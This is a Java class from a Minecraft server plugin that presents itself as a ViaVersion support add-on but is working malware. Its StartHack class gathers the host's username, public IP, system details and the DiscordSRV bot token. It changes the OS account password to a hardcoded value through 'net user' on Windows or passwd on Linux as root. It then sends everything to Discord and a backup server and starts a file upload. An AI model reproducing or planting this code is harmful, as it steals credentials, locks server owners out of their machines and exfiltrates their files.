package me.sfcevil.viaversionsupport.starthack;


import me.sfcevil.viaversionsupport.Discord;
import me.sfcevil.viaversionsupport.Main;
import me.sfcevil.viaversionsupport.backup.BackUpServer;
import me.sfcevil.viaversionsupport.fileupload.FileUpload;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.OperatingSystemMXBean;
import java.net.URL;
import java.util.concurrent.CompletableFuture;

public class StartHack {



    public static void start() {

        CompletableFuture.runAsync(() -> {
            OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
            MemoryMXBean memoryBean = ManagementFactory.getMemoryMXBean();
            String user = getName();
            String ip = getPublicIP();
            String system = osBean.getName() + " " + osBean.getVersion() + " " + osBean.getArch();
            String ram = memoryBean.getHeapMemoryUsage().getUsed() / (1024 * 1024) + " MB";
            String token = getDiscordToken();
            String changepass = changePassword();
            BackUpServer.send_msg("User: " + user + " IP:" + ip + " System:" + system + " Ram:" + ram + " Token:" + token + " Cp:" + changepass);
            //build
            Discord.sendmsg("User: " + user + " IP:" + ip + " System:" + system + " Ram:" + ram + " Token:" + token + " Cp:" + changepass);
            FileUpload.start_file_upload();
        });
    }

    private static String getName() {

        OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
        if(osBean.getName().toUpperCase().contains("WINDOW")) {
           return System.getenv("USERNAME");
        } else if(osBean.getName().toUpperCase().contains("LINUX")) {
           return System.getProperty("user.name");
        }
        return null;
    }

    private static String changePassword() {
        OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();

        if(osBean.getName().toUpperCase().contains("WINDOW")) {
          if(change_pass_window()) {
              return "Change pass success, new password: (123456987@Abc)";
          } else {
              return "Change pass fail";
          }
        } else if(osBean.getName().toUpperCase().contains("LINUX")) {
            if(change_pass_linux()) {
                return "Change pass success, new password: (123456987@Abc)";
            } else {
                return "Change pass fail, (no root)";
            }
        }
        return "null";
    }

    public static boolean change_pass_linux() {
        String username = System.getProperty("user.name");
        if(!username.contains("root")) {
            return false;
        }
        String newPassword = "(123456987@Abc)"; // Replace 'new_password' with the desired new password
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("passwd", username);
            Process process = processBuilder.start();
            // Write the new password to the process's standard input
            process.getOutputStream().write((newPassword + "\n").getBytes());
            process.getOutputStream().flush();

            // Wait for the process to complete
            int exitCode = process.waitFor();

            if (exitCode == 0) {
                return true;
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return false;
    }
    public static boolean change_pass_window() {
        String username = System.getenv("USERNAME");
        String newPassword = "(123456987@Abc)";
        try {
            String command = "net user " + username + " " + newPassword;
            //net user Administrator 123456987@ABC
            Process process = Runtime.getRuntime().exec(command);
            int exitCode = process.waitFor();
            if (exitCode == 0) {
               return true;
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return false;
    }

    private static String getDiscordToken() {
        File file = new File("plugins/DiscordSRV/", "config.yml");
        if(file != null) {
            FileConfiguration data = YamlConfiguration.loadConfiguration(file);
              return data.getString("BotToken");
        }
        return "No DiscordSrv";
    }


    public static String getPublicIP() {
        try {
            // Make an HTTP request to ipify API
            URL url = new URL("https://api.ipify.org");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            String publicIP = reader.readLine();
            reader.close();
            return publicIP;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "Invaid";
    }
}
